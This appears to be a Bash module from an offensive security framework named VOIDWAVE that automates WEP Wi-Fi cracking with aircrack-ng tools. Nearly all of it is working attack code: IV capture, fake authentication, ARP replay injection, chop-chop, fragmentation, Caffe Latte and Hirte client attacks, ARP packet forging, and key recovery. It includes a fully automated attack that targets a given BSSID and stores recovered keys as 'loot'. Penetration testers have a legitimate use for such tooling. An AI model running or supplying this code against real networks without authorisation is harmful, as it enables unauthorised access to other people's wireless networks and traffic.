#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# WEP Attacks: Complete WEP cracking suite (ARP replay, chop-chop, fragmentation)
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_WEP_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_WEP_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"

#═══════════════════════════════════════════════════════════════════════════════
# WEP CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default settings
declare -g WEP_MIN_IVS="${WEP_MIN_IVS:-10000}"
declare -g WEP_CRACK_IVS="${WEP_CRACK_IVS:-20000}"
declare -g WEP_FAKEAUTH_DELAY="${WEP_FAKEAUTH_DELAY:-10}"
declare -g WEP_ARP_RATE="${WEP_ARP_RATE:-500}"
declare -g WEP_TIMEOUT="${WEP_TIMEOUT:-600}"

# Process tracking
declare -g _WEP_CAPTURE_PID=""
declare -g _WEP_INJECT_PID=""
declare -g _WEP_AUTH_PID=""
declare -g _WEP_CRACK_PID=""

# State
declare -g _WEP_IVS_COUNT=0
declare -g _WEP_KEY=""
declare -g _WEP_CAP_FILE=""

#═══════════════════════════════════════════════════════════════════════════════
# IV CAPTURE
#═══════════════════════════════════════════════════════════════════════════════

# Start WEP IV capture
# Args: $1 = interface, $2 = target BSSID, $3 = channel, $4 = output file
wep_capture_start() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"
    local output_file="$4"

    wep_capture_stop

    log_info "Starting WEP IV capture for $target_bssid"

    # Set channel
    iwconfig "$iface" channel "$channel" 2>/dev/null

    # Start airodump with WEP filter
    airodump-ng --bssid "$target_bssid" -c "$channel" -w "$output_file" \
        --output-format pcap --ivs "$iface" &>/dev/null &

    _WEP_CAPTURE_PID=$!
    _WEP_CAP_FILE="${output_file}-01.ivs"

    log_debug "WEP capture started (PID: $_WEP_CAPTURE_PID)"
    return 0
}

# Stop WEP capture
wep_capture_stop() {
    if [[ -n "$_WEP_CAPTURE_PID" ]]; then
        kill "$_WEP_CAPTURE_PID" 2>/dev/null
        wait "$_WEP_CAPTURE_PID" 2>/dev/null
        _WEP_CAPTURE_PID=""
    fi
}

# Get current IV count
# Args: $1 = IVS file (optional, uses _WEP_CAP_FILE if not provided)
wep_get_iv_count() {
    local ivs_file="${1:-$_WEP_CAP_FILE}"

    if [[ -f "$ivs_file" ]]; then
        # IVS file size roughly correlates to IV count
        local size
        size=$(stat -c%s "$ivs_file" 2>/dev/null || echo 0)
        # Approximately 24 bytes per IV
        echo $((size / 24))
    else
        echo 0
    fi
}

# Monitor IV progress
wep_monitor_ivs() {
    local target="${1:-$WEP_CRACK_IVS}"

    while true; do
        local count
        count=$(wep_get_iv_count)
        _WEP_IVS_COUNT="$count"

        log_info "IVs collected: $count / $target"

        if [[ $count -ge $target ]]; then
            log_success "Sufficient IVs collected!"
            return 0
        fi

        sleep 10
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# FAKE AUTHENTICATION
#═══════════════════════════════════════════════════════════════════════════════

# Perform fake authentication
# Args: $1 = interface, $2 = target BSSID, $3 = source MAC (optional)
wep_fake_auth() {
    local iface="$1"
    local target_bssid="$2"
    local source_mac="${3:-}"

    if [[ -z "$source_mac" ]]; then
        source_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    fi

    log_info "Performing fake authentication with $target_bssid"

    # Initial authentication
    if aireplay-ng -1 0 -e "" -a "$target_bssid" -h "$source_mac" "$iface" 2>/dev/null | grep -q "Association successful"; then
        log_success "Fake authentication successful"
        return 0
    fi

    log_error "Fake authentication failed"
    return 1
}

# Keep fake authentication alive
# Args: $1 = interface, $2 = target BSSID, $3 = source MAC (optional)
wep_fake_auth_persistent() {
    local iface="$1"
    local target_bssid="$2"
    local source_mac="${3:-}"

    if [[ -z "$source_mac" ]]; then
        source_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    fi

    wep_stop_auth

    log_info "Starting persistent fake authentication"

    aireplay-ng -1 "$WEP_FAKEAUTH_DELAY" -e "" -a "$target_bssid" -h "$source_mac" \
        --ignore-negative-one "$iface" &>/dev/null &

    _WEP_AUTH_PID=$!

    log_debug "Persistent auth started (PID: $_WEP_AUTH_PID)"
    return 0
}

# Stop fake auth
wep_stop_auth() {
    if [[ -n "$_WEP_AUTH_PID" ]]; then
        kill "$_WEP_AUTH_PID" 2>/dev/null
        wait "$_WEP_AUTH_PID" 2>/dev/null
        _WEP_AUTH_PID=""
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# ARP REPLAY ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# ARP request replay attack
# Args: $1 = interface, $2 = target BSSID, $3 = source MAC (optional)
wep_arp_replay() {
    local iface="$1"
    local target_bssid="$2"
    local source_mac="${3:-}"

    if [[ -z "$source_mac" ]]; then
        source_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    fi

    wep_stop_inject

    log_info "Starting ARP request replay attack"

    aireplay-ng -3 -b "$target_bssid" -h "$source_mac" -x "$WEP_ARP_RATE" \
        --ignore-negative-one "$iface" &>/dev/null &

    _WEP_INJECT_PID=$!

    log_debug "ARP replay started (PID: $_WEP_INJECT_PID)"
    return 0
}

# Interactive packet replay
# Args: $1 = interface, $2 = target BSSID, $3 = replay cap file
wep_interactive_replay() {
    local iface="$1"
    local target_bssid="$2"
    local replay_file="$3"

    if [[ ! -f "$replay_file" ]]; then
        log_error "Replay file not found: $replay_file"
        return 1
    fi

    wep_stop_inject

    log_info "Starting interactive packet replay"

    aireplay-ng -2 -r "$replay_file" -b "$target_bssid" \
        --ignore-negative-one "$iface" &>/dev/null &

    _WEP_INJECT_PID=$!

    log_debug "Interactive replay started (PID: $_WEP_INJECT_PID)"
    return 0
}

# Stop injection
wep_stop_inject() {
    if [[ -n "$_WEP_INJECT_PID" ]]; then
        kill "$_WEP_INJECT_PID" 2>/dev/null
        wait "$_WEP_INJECT_PID" 2>/dev/null
        _WEP_INJECT_PID=""
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# CHOP-CHOP ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Chop-chop attack (decrypt packet without key)
# Args: $1 = interface, $2 = target BSSID, $3 = source MAC, $4 = output xor file
wep_chopchop() {
    local iface="$1"
    local target_bssid="$2"
    local source_mac="$3"
    local xor_file="$4"

    log_info "Starting Chop-Chop attack"
    log_info "This may take a while..."

    # Chop-chop attack to get PRGA
    local result
    result=$(aireplay-ng -4 -b "$target_bssid" -h "$source_mac" "$iface" 2>&1)

    if echo "$result" | grep -q "completed"; then
        # Find the created xor file
        local created_xor
        created_xor=$(echo "$result" | grep -o "replay_dec-[0-9-]*.xor" | head -1)

        if [[ -n "$created_xor" && -f "$created_xor" ]]; then
            mv "$created_xor" "$xor_file" 2>/dev/null
            log_success "Chop-chop attack successful"
            log_info "XOR file: $xor_file"
            return 0
        fi
    fi

    log_error "Chop-chop attack failed"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# FRAGMENTATION ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Fragmentation attack (obtain PRGA)
# Args: $1 = interface, $2 = target BSSID, $3 = source MAC, $4 = output xor file
wep_fragmentation() {
    local iface="$1"
    local target_bssid="$2"
    local source_mac="$3"
    local xor_file="$4"

    log_info "Starting fragmentation attack"
    log_info "This requires data packets from the AP..."

    local result
    result=$(aireplay-ng -5 -b "$target_bssid" -h "$source_mac" "$iface" 2>&1)

    if echo "$result" | grep -q "completed"; then
        local created_xor
        created_xor=$(echo "$result" | grep -o "fragment-[0-9-]*.xor" | head -1)

        if [[ -n "$created_xor" && -f "$created_xor" ]]; then
            mv "$created_xor" "$xor_file" 2>/dev/null
            log_success "Fragmentation attack successful"
            log_info "XOR file: $xor_file"
            return 0
        fi
    fi

    log_error "Fragmentation attack failed"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# CAFFE LATTE ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Caffe Latte attack (client-only, no AP needed)
# Args: $1 = interface, $2 = client MAC
wep_caffe_latte() {
    local iface="$1"
    local client_mac="$2"

    log_info "Starting Caffe Latte attack on client $client_mac"
    log_info "This attacks the client directly without needing the AP"

    aireplay-ng -6 -b "FF:FF:FF:FF:FF:FF" -h "$client_mac" \
        --ignore-negative-one "$iface" &>/dev/null &

    _WEP_INJECT_PID=$!

    log_debug "Caffe Latte attack started (PID: $_WEP_INJECT_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# HIRTE ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Hirte attack (improved Caffe Latte)
# Args: $1 = interface, $2 = client MAC
wep_hirte() {
    local iface="$1"
    local client_mac="$2"

    log_info "Starting Hirte attack on client $client_mac"
    log_info "Enhanced client-side WEP attack"

    aireplay-ng -7 -b "FF:FF:FF:FF:FF:FF" -h "$client_mac" \
        --ignore-negative-one "$iface" &>/dev/null &

    _WEP_INJECT_PID=$!

    log_debug "Hirte attack started (PID: $_WEP_INJECT_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# FORGE PACKETS
#═══════════════════════════════════════════════════════════════════════════════

# Forge ARP packet using PRGA
# Args: $1 = xor file, $2 = target BSSID, $3 = source IP, $4 = dest IP, $5 = output file
wep_forge_arp() {
    local xor_file="$1"
    local target_bssid="$2"
    local src_ip="$3"
    local dst_ip="$4"
    local output_file="$5"

    if [[ ! -f "$xor_file" ]]; then
        log_error "XOR file not found: $xor_file"
        return 1
    fi

    log_info "Forging ARP packet"

    if packetforge-ng -0 -a "$target_bssid" -h "$(cat /sys/class/net/*/address | head -1)" \
        -k "$dst_ip" -l "$src_ip" -y "$xor_file" -w "$output_file" &>/dev/null; then
        log_success "ARP packet forged: $output_file"
        return 0
    fi

    log_error "Failed to forge ARP packet"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# WEP KEY CRACKING
#═══════════════════════════════════════════════════════════════════════════════

# Crack WEP key
# Args: $1 = capture file or IVS file, $2 = target BSSID
wep_crack() {
    local cap_file="$1"
    local target_bssid="$2"

    if [[ ! -f "$cap_file" ]]; then
        log_error "Capture file not found: $cap_file"
        return 1
    fi

    log_info "Attempting to crack WEP key..."

    local result
    result=$(aircrack-ng -b "$target_bssid" "$cap_file" 2>&1)

    # Extract key
    local key
    key=$(echo "$result" | sed -n 's/.*KEY FOUND! \[[[:space:]]*\([0-9A-F:]*\).*/\1/p')

    if [[ -n "$key" ]]; then
        _WEP_KEY="${key//:/}"
        log_success "WEP KEY FOUND: $key"
        log_success "ASCII: $(echo "$_WEP_KEY" | xxd -r -p)"

        # Save to loot
        if declare -F wireless_loot_add_cracked &>/dev/null; then
            wireless_loot_add_cracked "$target_bssid" "" "$key" "wep"
        fi

        return 0
    fi

    log_warning "Key not found (need more IVs)"
    return 1
}

# Crack WEP with PTW attack
# Args: $1 = capture file, $2 = target BSSID
wep_crack_ptw() {
    local cap_file="$1"
    local target_bssid="$2"

    log_info "Attempting PTW attack (faster, needs ARP packets)"

    local result
    result=$(aircrack-ng -z -b "$target_bssid" "$cap_file" 2>&1)

    local key
    key=$(echo "$result" | sed -n 's/.*KEY FOUND! \[[[:space:]]*\([0-9A-F:]*\).*/\1/p')

    if [[ -n "$key" ]]; then
        _WEP_KEY="${key//:/}"
        log_success "WEP KEY FOUND (PTW): $key"
        return 0
    fi

    log_warning "PTW attack unsuccessful"
    return 1
}

# Background cracking (continuously retry)
# Args: $1 = capture file, $2 = target BSSID
wep_crack_background() {
    local cap_file="$1"
    local target_bssid="$2"

    wep_stop_crack

    log_info "Starting background WEP cracking"

    (
        while true; do
            if wep_crack "$cap_file" "$target_bssid"; then
                break
            fi
            sleep 30
        done
    ) &

    _WEP_CRACK_PID=$!
    log_debug "Background cracking started (PID: $_WEP_CRACK_PID)"
}

# Stop background cracking
wep_stop_crack() {
    if [[ -n "$_WEP_CRACK_PID" ]]; then
        kill "$_WEP_CRACK_PID" 2>/dev/null
        wait "$_WEP_CRACK_PID" 2>/dev/null
        _WEP_CRACK_PID=""
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# FULL WEP ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Full automated WEP attack
# Args: $1 = interface, $2 = target BSSID, $3 = channel, $4 = ESSID
wep_attack_full() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"
    local essid="${4:-}"

    local output_dir="${WIRELESS_LOOT_CAPTURES:-/tmp}"
    local output_base="${output_dir}/wep_${target_bssid//:/}_$(date +%s)"
    local source_mac
    source_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)

    log_info "Starting full WEP attack on ${C_WHITE}${essid:-$target_bssid}${C_RESET}"
    log_info "Target: $target_bssid (Channel $channel)"

    # Start IV capture
    wep_capture_start "$iface" "$target_bssid" "$channel" "$output_base"

    # Wait a bit for capture to stabilize
    sleep 3

    # Fake authentication
    if ! wep_fake_auth "$iface" "$target_bssid" "$source_mac"; then
        log_warning "Fake auth failed, trying with different MAC"
        # Try with random MAC
        source_mac="00:11:22:33:44:55"
        wep_fake_auth "$iface" "$target_bssid" "$source_mac"
    fi

    # Keep auth alive
    wep_fake_auth_persistent "$iface" "$target_bssid" "$source_mac"

    # Start ARP replay
    wep_arp_replay "$iface" "$target_bssid" "$source_mac"

    # Monitor and crack
    local start_time
    start_time=$(date +%s)

    while true; do
        local elapsed=$(($(date +%s) - start_time))

        # Check timeout
        if [[ $elapsed -ge $WEP_TIMEOUT ]]; then
            log_error "Attack timeout"
            break
        fi

        # Get IV count
        local iv_count
        iv_count=$(wep_get_iv_count)
        _WEP_IVS_COUNT="$iv_count"

        log_info "IVs: $iv_count (${elapsed}s elapsed)"

        # Try cracking when we have enough IVs
        if [[ $iv_count -ge $WEP_MIN_IVS ]]; then
            log_info "Attempting crack with $iv_count IVs..."

            wep_capture_stop
            sleep 1

            if wep_crack "$_WEP_CAP_FILE" "$target_bssid"; then
                log_success "Attack successful!"
                wep_stop_all
                return 0
            fi

            # Resume capture
            wep_capture_start "$iface" "$target_bssid" "$channel" "$output_base"
        fi

        sleep 30
    done

    log_warning "Attack did not succeed within timeout"
    wep_stop_all
    return 1
}

# Quick WEP attack (PTW method, faster)
# Args: $1 = interface, $2 = target BSSID, $3 = channel
wep_attack_quick() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"

    local output_dir="/tmp"
    local output_base="${output_dir}/wep_quick_$$"
    local source_mac
    source_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)

    log_info "Starting quick WEP attack (PTW method)"

    # Start capture (CAP file, not IVS for PTW)
    airodump-ng --bssid "$target_bssid" -c "$channel" -w "$output_base" \
        --output-format pcap "$iface" &>/dev/null &
    _WEP_CAPTURE_PID=$!
    _WEP_CAP_FILE="${output_base}-01.cap"

    sleep 2

    # Fake auth and ARP replay
    wep_fake_auth "$iface" "$target_bssid" "$source_mac"
    wep_arp_replay "$iface" "$target_bssid" "$source_mac"

    # Wait for packets and try PTW
    local attempts=0
    while [[ $attempts -lt 10 ]]; do
        sleep 30
        ((attempts++)) || true

        log_info "PTW attempt $attempts/10..."

        wep_capture_stop
        sleep 1

        if wep_crack_ptw "$_WEP_CAP_FILE" "$target_bssid"; then
            wep_stop_all
            return 0
        fi

        # Resume capture
        airodump-ng --bssid "$target_bssid" -c "$channel" -w "$output_base" \
            --output-format pcap "$iface" &>/dev/null &
        _WEP_CAPTURE_PID=$!
    done

    log_warning "Quick attack did not succeed"
    wep_stop_all
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# CONTROL AND STATUS
#═══════════════════════════════════════════════════════════════════════════════

# Stop all WEP processes
wep_stop_all() {
    wep_capture_stop
    wep_stop_inject
    wep_stop_auth
    wep_stop_crack

    pkill -f "aireplay-ng.*-3" 2>/dev/null
    pkill -f "aireplay-ng.*-1" 2>/dev/null
}

# Get attack status
wep_status() {
    echo ""
    echo -e "    ${C_CYAN}WEP Attack Status${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..40})${C_RESET}"

    # Capture
    if [[ -n "$_WEP_CAPTURE_PID" ]] && kill -0 "$_WEP_CAPTURE_PID" 2>/dev/null; then
        echo -e "    Capture:    ${C_GREEN}Running${C_RESET}"
    else
        echo -e "    Capture:    ${C_RED}Stopped${C_RESET}"
    fi

    # Auth
    if [[ -n "$_WEP_AUTH_PID" ]] && kill -0 "$_WEP_AUTH_PID" 2>/dev/null; then
        echo -e "    Auth:       ${C_GREEN}Running${C_RESET}"
    else
        echo -e "    Auth:       ${C_RED}Stopped${C_RESET}"
    fi

    # Injection
    if [[ -n "$_WEP_INJECT_PID" ]] && kill -0 "$_WEP_INJECT_PID" 2>/dev/null; then
        echo -e "    Injection:  ${C_GREEN}Running${C_RESET}"
    else
        echo -e "    Injection:  ${C_RED}Stopped${C_RESET}"
    fi

    echo -e "    IVs:        ${C_WHITE}$_WEP_IVS_COUNT${C_RESET}"

    if [[ -n "$_WEP_KEY" ]]; then
        echo -e "    KEY:        ${C_GREEN}$_WEP_KEY${C_RESET}"
    fi

    echo ""
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

wep_cleanup() {
    wep_stop_all
    rm -f /tmp/wep_*.ivs /tmp/wep_*.cap /tmp/wep_*.xor 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup wep_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f wep_capture_start wep_capture_stop wep_get_iv_count wep_monitor_ivs
export -f wep_fake_auth wep_fake_auth_persistent wep_stop_auth
export -f wep_arp_replay wep_interactive_replay wep_stop_inject
export -f wep_chopchop wep_fragmentation
export -f wep_caffe_latte wep_hirte
export -f wep_forge_arp
export -f wep_crack wep_crack_ptw wep_crack_background wep_stop_crack
export -f wep_attack_full wep_attack_quick
export -f wep_stop_all wep_status wep_cleanup
